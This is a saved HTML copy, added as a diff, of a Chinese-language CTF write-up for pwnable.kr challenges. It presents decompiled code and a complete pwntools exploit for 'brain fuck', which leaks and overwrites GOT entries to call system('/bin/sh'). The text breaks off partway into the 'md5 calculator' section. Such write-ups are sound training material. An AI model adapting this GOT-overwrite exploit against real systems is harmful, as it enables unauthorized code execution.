@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<!-- saved from url=(0061)http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr.html -->
+<html class="js cssanimations"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Rookiss Writeup [pwnable.kr]</title>
+  <link rel="icon" href="http://rickgray.me/favicon.ico">
+  <link rel="apple-touch-icon" href="http://rickgray.me/public/img/head.png">
+  <link rel="stylesheet" href="./Rookiss Writeup [pwnable.kr]_files/amazeui.min.css">
+  <link rel="stylesheet" href="./Rookiss Writeup [pwnable.kr]_files/app.css">
+  <link rel="stylesheet" href="./Rookiss Writeup [pwnable.kr]_files/github.css">
+<script src="./Rookiss Writeup [pwnable.kr]_files/hm.js"></script><script type="text/javascript" async="" src="./Rookiss Writeup [pwnable.kr]_files/embed.js"></script><style type="text/css"></style><meta name="wecite_data" id="wecite-data" content="{&quot;Title&quot;:&quot;Rookiss Writeup [pwnable.kr]&quot;,&quot;Author&quot;:&quot;&quot;,&quot;Abstract&quot;:&quot;&quot;,&quot;Image&quot;:&quot;&quot;,&quot;Keywords&quot;:&quot;&quot;,&quot;src_likes&quot;:&quot;0&quot;,&quot;src_shares&quot;:&quot;0&quot;,&quot;src_comments&quot;:&quot;0&quot;,&quot;src_reads&quot;:&quot;0&quot;,&quot;src_up&quot;:&quot;0&quot;,&quot;src_down&quot;:&quot;0&quot;,&quot;DateTime&quot;:&quot;2017-08-01 16:41:32&quot;,&quot;Reference Type&quot;:&quot;Web Page&quot;,&quot;Year&quot;:2017,&quot;SiteType&quot;:&quot;c3&quot;,&quot;URL&quot;:&quot;http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr.html&quot;}"><link rel="preload" as="style" href="https://c.disquscdn.com/next/embed/styles/lounge.eceee602870fc4ed49dc5f89e270689e.css"><link rel="preload" as="script" href="https://c.disquscdn.com/next/embed/common.bundle.9fcff11af667507b1757062f0192b821.js"><link rel="preload" as="script" href="https://c.disquscdn.com/next/embed/lounge.bundle.aafec1a2f3fa1e486216be04908b0e3a.js"><link rel="preload" as="script" href="https://disqus.com/next/config.js"></head>
+<body>
+
+<div class="am-container lp-container">
+  <header class="am-topbar lp-topbar">
+    <h1 class="am-topbar-brand">
+      <a href="http://rickgray.me/">rickgray.me</a>
+    </h1>
+    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-danger am-show-sm-only" data-am-collapse="{target: &#39;#lp-topbar-collapse&#39;}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
+    <div class="am-collapse am-topbar-collapse am-topbar-right" id="lp-topbar-collapse">
+      <ul class="am-nav am-nav-pills am-topbar-nav">
+        <li><a href="http://rickgray.me/">Archives</a></li>
+        <!-- <li><a href="#">Categories</a></li> -->
+        <li><a href="http://rickgray.me/friends.html">Friends</a></li>
+        <!-- <li><a href="#">About Me</a></li> -->
+        <li><a href="http://rickgray.me/feed.xml">Feed</a></li>
+      </ul>
+    </div>
+  </header>
+</div>
+
+
+<div class="am-container lp-container">
+  <div class="lp-post">
+    <div class="lp-post-header">
+      <h1 class="lp-post-title">Rookiss Writeup [pwnable.kr]</h1>
+      <div class="lp-post-meta">
+        <i class="am-icon-calculator"></i><span class="lp-post-date">2015-07-25</span>
+        <i class="am-icon-tags"></i><span class="lp-post-tags">pwn, security</span>
+      </div>
+    </div>
+    <div class="lp-post-content">
+    <p>（PS：文章内容会随着做题进度进行更新）</p>
+
+<h3 id="brain-fuck">[brain fuck]</h3>
+
+<blockquote>
+  <p>I made a simple brain-fuck language emulation program written in C.<br>
+The [ ] commands are not implemented yet. However the rest functionality seems working fine.<br>
+Find a bug and exploit it to get a shell.</p>
+
+  <p>Download : http://pwnable.kr/bin/bf<br>
+Download : http://pwnable.kr/bin/bf_libc.so</p>
+
+  <p>Running at : nc pwnable.kr 9001</p>
+</blockquote>
+
+<p><code class="highlighter-rouge">bf</code> 为 32 位 ELF 程序：</p>
+
+<p><img src="./Rookiss Writeup [pwnable.kr]_files/brain-fuck-1.png" alt="img"></p>
+
+<p>使用 IDA 分析，程序会让你输入一串字符（最多1024bytes）然后遍历字符进行解析：</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code class="hljs cpp"><span class="kt"><span class="hljs-keyword">int</span></span> <span class="kr">__<span class="hljs-function">cdecl</span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">argc</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">**</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">argv</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">**</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">envp</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
+</span><span class="p">{</span>
+  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">result</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// eax@4</span>
+</span>  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">v4</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// edx@4</span>
+</span>  <span class="kt"><span class="hljs-keyword">size_t</span></span> <span class="n">i</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// [sp+28h] [bp-40Ch]@1</span>
+</span>  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">v6</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// [sp+2Ch] [bp-408h]@1</span>
+</span>  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">v7</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// [sp+42Ch] [bp-8h]@1</span>
+</span>	
+  <span class="n">v7</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi"><span class="hljs-number">20</span></span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n"><span class="hljs-built_in">stdout</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">2</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n"><span class="hljs-built_in">stdin</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">1</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
+  <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt"><span class="hljs-keyword">int</span></span><span class="p">)</span><span class="o">&amp;</span><span class="n">tape</span><span class="p">;</span>
+  <span class="n"><span class="hljs-built_in">puts</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"welcome to brainfuck testing system!!"</span></span><span class="p">);</span>
+  <span class="n"><span class="hljs-built_in">puts</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"type some brainfuck instructions except [ ]"</span></span><span class="p">);</span>
+  <span class="n"><span class="hljs-built_in">memset</span></span><span class="p">(</span><span class="o">&amp;</span><span class="n">v6</span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mh"><span class="hljs-number">0x400</span>u</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">((</span><span class="kt"><span class="hljs-keyword">char</span></span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v6</span><span class="p">,</span> <span class="mi"><span class="hljs-number">1024</span></span><span class="p">,</span> <span class="n"><span class="hljs-built_in">stdin</span></span><span class="p">);</span>
+  <span class="k"><span class="hljs-keyword">for</span></span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n"><span class="hljs-built_in">strlen</span></span><span class="p">((</span><span class="k"><span class="hljs-keyword">const</span></span> <span class="kt"><span class="hljs-keyword">char</span></span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="n">do_brainfuck</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v6</span> <span class="o">+</span> <span class="n">i</span><span class="p">));</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi"><span class="hljs-number">20</span></span><span class="p">)</span> <span class="o">^</span> <span class="n">v7</span><span class="p">;</span>
+  <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<p><code class="highlighter-rouge">do_brainfuck</code> 函数有一些列对指针 <code class="highlighter-rouge">p</code> 进行操作的分支：</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code class="hljs cpp"><span class="kt"><span class="hljs-keyword">int</span></span> <span class="kr">__<span class="hljs-function">cdecl</span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">do_brainfuck</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">a1</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
+</span><span class="p">{</span>
+  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">result</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// eax@1</span>
+</span>  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">v2</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// ebx@7</span>
+</span>	
+  <span class="n">result</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
+  <span class="k"><span class="hljs-keyword">switch</span></span> <span class="p">(</span> <span class="n">a1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k"><span class="hljs-keyword">case</span></span> <span class="sc"><span class="hljs-string">'&gt;'</span></span><span class="p">:</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">p</span><span class="o">++</span> <span class="o">+</span> <span class="mi"><span class="hljs-number">1</span></span><span class="p">;</span>
+      <span class="k"><span class="hljs-keyword">break</span></span><span class="p">;</span>
+    <span class="k"><span class="hljs-keyword">case</span></span> <span class="sc"><span class="hljs-string">'&lt;'</span></span><span class="p">:</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">p</span><span class="o">--</span> <span class="o">-</span> <span class="mi"><span class="hljs-number">1</span></span><span class="p">;</span>
+      <span class="k"><span class="hljs-keyword">break</span></span><span class="p">;</span>
+    <span class="k"><span class="hljs-keyword">case</span></span> <span class="sc"><span class="hljs-string">'+'</span></span><span class="p">:</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
+      <span class="o">++*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
+      <span class="k"><span class="hljs-keyword">break</span></span><span class="p">;</span>
+    <span class="k"><span class="hljs-keyword">case</span></span> <span class="sc"><span class="hljs-string">'-'</span></span><span class="p">:</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
+      <span class="o">--*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
+      <span class="k"><span class="hljs-keyword">break</span></span><span class="p">;</span>
+    <span class="k"><span class="hljs-keyword">case</span></span> <span class="sc"><span class="hljs-string">'.'</span></span><span class="p">:</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n"><span class="hljs-built_in">putchar</span></span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">);</span>
+      <span class="k"><span class="hljs-keyword">break</span></span><span class="p">;</span>
+    <span class="k"><span class="hljs-keyword">case</span></span> <span class="sc"><span class="hljs-string">','</span></span><span class="p">:</span>
+      <span class="n">v2</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+      <span class="k"><span class="hljs-keyword">break</span></span><span class="p">;</span>
+    <span class="k"><span class="hljs-keyword">case</span></span> <span class="sc"><span class="hljs-string">'['</span></span><span class="p">:</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n"><span class="hljs-built_in">puts</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"[ and ] not supported."</span></span><span class="p">);</span>
+      <span class="k"><span class="hljs-keyword">break</span></span><span class="p">;</span>
+    <span class="nl"><span class="hljs-keyword">default</span>:</span>
+      <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">result</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<p>这里的指针 <code class="highlighter-rouge">p</code> 是一个字符型指针，每次自增或自减会使得指向的地址 <code class="highlighter-rouge">+0x1</code> 或 <code class="highlighter-rouge">-0x1</code>。根据分析可以得到如下解析说明：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code class="hljs coffeescript"><span class="hljs-string">'&gt;'</span> =<span class="hljs-function">=&gt;</span> p++
+<span class="hljs-string">'&lt;'</span> =<span class="hljs-function">=&gt;</span> p--
+<span class="hljs-string">'+'</span> =<span class="hljs-function">=&gt;</span> *p += <span class="hljs-number">1</span>
+<span class="hljs-string">'-'</span> =<span class="hljs-function">=&gt;</span> *p -= <span class="hljs-number">1</span>
+<span class="hljs-string">'.'</span> =<span class="hljs-function">=&gt;</span> putchar(*p)
+<span class="hljs-string">','</span> =<span class="hljs-function">=&gt;</span> *p = getchar()
+<span class="hljs-string">'['</span> =<span class="hljs-function">=&gt;</span> puts(xxxx)
+</code></pre>
+</div>
+
+<p>这里既能控制指针，又能读写指针指向地址的值，并且指针 <code class="highlighter-rouge">p</code> 初始值为 <code class="highlighter-rouge">0x0804A0A0 (tape)</code>，而往低地址一点就是 <code class="highlighter-rouge">.got.plt</code>。因为题目提供了 libc 文件，所以这里可以通过泄漏 <code class="highlighter-rouge">.got.plt</code> 中的 <code class="highlighter-rouge">fgets()</code> 函数地址来计算目标环境的 <code class="highlighter-rouge">system()</code> 函数地址，然后重写 <code class="highlighter-rouge">.got.plt</code> 结构来使得 <code class="highlighter-rouge">fgets()</code> 的 GOT 变为 <code class="highlighter-rouge">system()</code>，<code class="highlighter-rouge">memset()</code> 的 GOT 变为 <code class="highlighter-rouge">gets()</code>，然后通过修改 <code class="highlighter-rouge">putchar()</code> 的 GOT 为主函数 <code class="highlighter-rouge">main()</code>，从而执行到 <code class="highlighter-rouge">0x08048700 - 0x08048734</code> 处代码的时候实际上执行的是 <code class="highlighter-rouge">system(gets())</code>：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code class="hljs css"><span class="hljs-class">.text</span><span class="hljs-pseudo">:08048700</span>                 <span class="hljs-tag">mov</span>     <span class="hljs-tag">dword</span> <span class="hljs-tag">ptr</span> <span class="hljs-attr_selector">[esp+8]</span>, 400<span class="hljs-tag">h</span> ; <span class="hljs-tag">n</span>
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:08048708</span>                 <span class="hljs-tag">mov</span>     <span class="hljs-tag">dword</span> <span class="hljs-tag">ptr</span> <span class="hljs-attr_selector">[esp+4]</span>, 0 ; <span class="hljs-tag">c</span>
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:08048710</span>                 <span class="hljs-tag">lea</span>     <span class="hljs-tag">eax</span>, <span class="hljs-attr_selector">[esp+2Ch]</span>
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:08048714</span>                 <span class="hljs-tag">mov</span>     <span class="hljs-attr_selector">[esp]</span>, <span class="hljs-tag">eax</span>      ; <span class="hljs-tag">s</span>
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:08048717</span>                 <span class="hljs-tag">call</span>    _<span class="hljs-tag">memset</span>         ; <span class="hljs-tag">rewrite</span> <span class="hljs-tag">memset</span>() <span class="hljs-tag">to</span> <span class="hljs-tag">fgets</span>()
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:0804871C</span>                 <span class="hljs-tag">mov</span>     <span class="hljs-tag">eax</span>, <span class="hljs-tag">ds</span><span class="hljs-pseudo">:stdin</span><span class="hljs-at_rule">@<span class="hljs-keyword">@GLIBC_2_0</span>
+.text:<span class="hljs-number">08048721</span>                 mov     [esp+<span class="hljs-number">8</span>], eax    </span>; <span class="hljs-tag">stream</span>
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:08048725</span>                 <span class="hljs-tag">mov</span>     <span class="hljs-tag">dword</span> <span class="hljs-tag">ptr</span> <span class="hljs-attr_selector">[esp+4]</span>, 400<span class="hljs-tag">h</span> ; <span class="hljs-tag">n</span>
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:0804872D</span>                 <span class="hljs-tag">lea</span>     <span class="hljs-tag">eax</span>, <span class="hljs-attr_selector">[esp+2Ch]</span>
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:08048731</span>                 <span class="hljs-tag">mov</span>     <span class="hljs-attr_selector">[esp]</span>, <span class="hljs-tag">eax</span>      ; <span class="hljs-tag">s</span>
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:08048734</span>                 <span class="hljs-tag">call</span>    _<span class="hljs-tag">fgets</span>          ; <span class="hljs-tag">rewrite</span> <span class="hljs-tag">fgets</span>() <span class="hljs-tag">to</span> <span class="hljs-tag">system</span>()
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:08048739</span>                 <span class="hljs-tag">mov</span>     <span class="hljs-tag">dword</span> <span class="hljs-tag">ptr</span> <span class="hljs-attr_selector">[esp+28h]</span>, 0
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:08048741</span>                 <span class="hljs-tag">jmp</span>     <span class="hljs-tag">short</span> <span class="hljs-tag">loc_8048760</span>
+</code></pre>
+</div>
+
+<p>最终的 exp 如下：</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code class="hljs perl"><span class="c"><span class="hljs-comment">#!/usr/bin/env python</span></span>
+<span class="c"><span class="hljs-comment"># coding: utf-8</span></span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c"><span class="hljs-comment"># Remote EXP</span></span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s"><span class="hljs-string">'./bf_libc.so'</span></span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s"><span class="hljs-string">'pwnable.kr'</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">9001</span></span><span class="p">)</span>
+
+<span class="c"><span class="hljs-comment"># Local EXP</span></span>
+<span class="c"><span class="hljs-comment"># libc = ELF('./libc.so.6')</span></span>
+<span class="c"><span class="hljs-comment"># p = process('./bf')</span></span>
+
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvline_startswith</span><span class="p">(</span><span class="s"><span class="hljs-string">'type'</span></span><span class="p">)</span>
+
+<span class="c"><span class="hljs-comment"># Move the pointer to .got.plt fgets()</span></span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s"><span class="hljs-string">'&lt;'</span></span> <span class="o">*</span> <span class="p">(</span><span class="mh"><span class="hljs-number">0x0804A0A0</span></span> <span class="o">-</span> <span class="mh"><span class="hljs-number">0x0804A010</span></span><span class="p">)</span>
+<span class="c"><span class="hljs-comment"># Print .got.plt fgets() address in memory each bytes</span></span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s"><span class="hljs-string">'.&gt;'</span></span> <span class="o">*</span> <span class="mi"><span class="hljs-number">4</span></span>
+<span class="c"><span class="hljs-comment"># reMove the pointer to .got.plt fgets()</span></span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s"><span class="hljs-string">'&lt;'</span></span> <span class="o">*</span> <span class="mi"><span class="hljs-number">4</span></span>
+<span class="c"><span class="hljs-comment"># Write .got.plt fgets() to system()</span></span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s"><span class="hljs-string">',&gt;'</span></span> <span class="o">*</span> <span class="mi"><span class="hljs-number">4</span></span>
+<span class="c"><span class="hljs-comment"># Move the pointer to .got.plt memset()</span></span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s"><span class="hljs-string">'&gt;'</span></span> <span class="o">*</span> <span class="p">(</span><span class="mh"><span class="hljs-number">0x0804A02C</span></span> <span class="o">-</span> <span class="mh"><span class="hljs-number">0x0804A014</span></span><span class="p">)</span>
+<span class="c"><span class="hljs-comment"># Write .got.plt memset() to fgets()</span></span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s"><span class="hljs-string">',&gt;'</span></span> <span class="o">*</span> <span class="mi"><span class="hljs-number">4</span></span>
+<span class="c"><span class="hljs-comment"># Writr .got.plt putchar() to main() 0x08048671</span></span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s"><span class="hljs-string">',&gt;'</span></span> <span class="o">*</span> <span class="mi"><span class="hljs-number">4</span></span>
+<span class="c"><span class="hljs-comment"># Call putchar(), actually main() called</span></span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s"><span class="hljs-string">'.'</span></span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">fgets_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi"><span class="hljs-number">4</span></span><span class="p">)[::</span><span class="o">-</span><span class="mi"><span class="hljs-number">1</span></span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s"><span class="hljs-string">'hex'</span></span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="nb"><span class="hljs-keyword">int</span></span><span class="p">(</span><span class="n">fgets_addr</span><span class="p">,</span> <span class="mi"><span class="hljs-number">16</span></span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s"><span class="hljs-string">'fgets'</span></span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s"><span class="hljs-string">'system'</span></span><span class="p">]</span>
+<span class="n">gets_addr</span> <span class="o">=</span> <span class="nb"><span class="hljs-keyword">int</span></span><span class="p">(</span><span class="n">fgets_addr</span><span class="p">,</span> <span class="mi"><span class="hljs-number">16</span></span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s"><span class="hljs-string">'fgets'</span></span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s"><span class="hljs-string">'gets'</span></span><span class="p">]</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n"><span class="hljs-keyword">send</span></span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n"><span class="hljs-keyword">send</span></span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">gets_addr</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n"><span class="hljs-keyword">send</span></span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh"><span class="hljs-number">0x08048671</span></span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s"><span class="hljs-string">'/bin/sh'</span></span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre>
+</div>
+
+<h3 id="md5-calculator">[md5 calculator]</h3>
+
+<blockquote>
+  <p>We made a simple MD5 calculator as a network service.<br>
+Find a bug and exploit it to get a shell.</p>
+
+  <p>Download : http://pwnable.kr/bin/hash<br>
+hint : this service shares the same machine with pwnable.kr web service</p>
+
+  <p>Running at : nc pwnable.kr 9002</p>
+</blockquote>
+
+<p><code class="highlighter-rouge">hash</code> 为 32 位 ELF 程序，并且开启了 <code class="highlighter-rouge">CANARY</code> 和 <code class="highlighter-rouge">NX</code>：</p>
+
+<p><img src="./Rookiss Writeup [pwnable.kr]_files/md5-calculator-1.png" alt="img"></p>
+
+<p>程序逻辑首先是通过一个随机 HASH 值验证，然后让你输入一串 Base64 编码的字符串，程序对 Base64 解码后的字符串计算 MD5 值并输出：</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code class="hljs cpp"><span class="kt"><span class="hljs-keyword">int</span></span> <span class="kr">__<span class="hljs-function">cdecl</span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">argc</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">**</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">argv</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">**</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">envp</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
+</span><span class="p">{</span>
+  <span class="kt"><span class="hljs-keyword">unsigned</span></span> <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">v3</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// eax@1</span>
+</span>  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">v5</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// [sp+18h] [bp-8h]@1</span>
+</span>  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">v6</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// [sp+1Ch] [bp-4h]@1</span>
+</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n"><span class="hljs-built_in">stdout</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">1</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n"><span class="hljs-built_in">stdin</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">1</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
+  <span class="n"><span class="hljs-built_in">puts</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"- Welcome to the free MD5 calculating service -"</span></span><span class="p">);</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
